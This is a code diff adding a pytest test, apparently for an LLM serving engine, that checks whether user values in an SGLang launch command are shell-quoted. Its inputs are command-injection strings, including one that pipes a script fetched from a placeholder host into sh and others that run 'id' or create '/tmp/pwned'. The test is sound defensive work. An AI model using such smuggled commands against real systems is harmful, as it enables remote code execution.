@@ -18,6 +18,7 @@ from model_engine_server.common.dtos.llms import (
     CreateLLMModelEndpointV1Request,
     CreateLLMModelEndpointV1Response,
     ModelDownloadRequest,
+    SGLangEndpointAdditionalArgs,
     TokenOutput,
     UpdateLLMModelEndpointV1Request,
     VLLMEndpointAdditionalArgs,
@@ -752,6 +753,75 @@ def test_load_model_weights_sub_commands(
         " gs://fake-bucket/fake-checkpoint test_folder",
     ]
     assert expected_result == subcommands
+
+
+@pytest.mark.asyncio
+async def test_create_sglang_bundle_quotes_user_values(
+    monkeypatch,
+    test_api_key: str,
+    fake_model_bundle_repository,
+    fake_docker_repository_image_always_exists,
+    fake_model_primitive_gateway,
+    fake_llm_artifact_gateway,
+):
+    monkeypatch.setattr(llm_use_cases.hmi_config, "sglang_repository", "sglang")
+    bundle_use_case = CreateModelBundleV2UseCase(
+        model_bundle_repository=fake_model_bundle_repository,
+        docker_repository=fake_docker_repository_image_always_exists,
+        model_primitive_gateway=fake_model_primitive_gateway,
+    )
+    llm_bundle_use_case = CreateLLMModelBundleV1UseCase(
+        create_model_bundle_use_case=bundle_use_case,
+        model_bundle_repository=fake_model_bundle_repository,
+        llm_artifact_gateway=fake_llm_artifact_gateway,
+        docker_repository=fake_docker_repository_image_always_exists,
+    )
+    model_name = "m; curl https://example.invalid/p.sh | sh; #"
+    huggingface_repo = "org/repo $(id>/tmp/x)"
+    load_format = "auto' && touch /tmp/pwned && echo '"
+    lora_paths = ["a b", "c;d"]
+
+    bundle_id = await llm_bundle_use_case.create_sglang_bundle(
+        user=User(user_id=test_api_key, team_id=test_api_key, is_privileged_user=True),
+        model_name=model_name,
+        framework_image_tag="0.4.0",
+        endpoint_unique_name="test-sglang-endpoint",
+        num_shards=2,
+        checkpoint_path="s3://fake-bucket/fake-checkpoint",
+        chat_template_override=None,
+        additional_args=SGLangEndpointAdditionalArgs(
+            huggingface_repo=huggingface_repo,
+            load_format=load_format,
+            lora_paths=lora_paths,
+        ),
+    )
+
+    bundle = await fake_model_bundle_repository.get_model_bundle(bundle_id)
+    command = bundle.flavor.command
+    assert command[:2] == ["/bin/bash", "-c"]
+    argv = shlex.split(command[2])
+    assert argv[:11] == [
+        "python3",
+        "-m",
+        "sglang.launch_server",
+        "--model-path",
+        huggingface_repo,
+        "--served-model-name",
+        model_name,
+        "--port",
+        "5005",
+        "--host",
+        "::",
+    ]
+    flags = {
+        flag: argv[argv.index(flag) + 1 : argv.index(flag) + 1 + count]
+        for flag, count in [("--tp-size", 1), ("--load-format", 1), ("--lora-paths", 2)]
+    }
+    assert flags == {
+        "--tp-size": ["2"],
+        "--load-format": [load_format],
+        "--lora-paths": lora_paths,
+    }
 
 
 def test_create_vllm_bundle_command_with_model_cache(
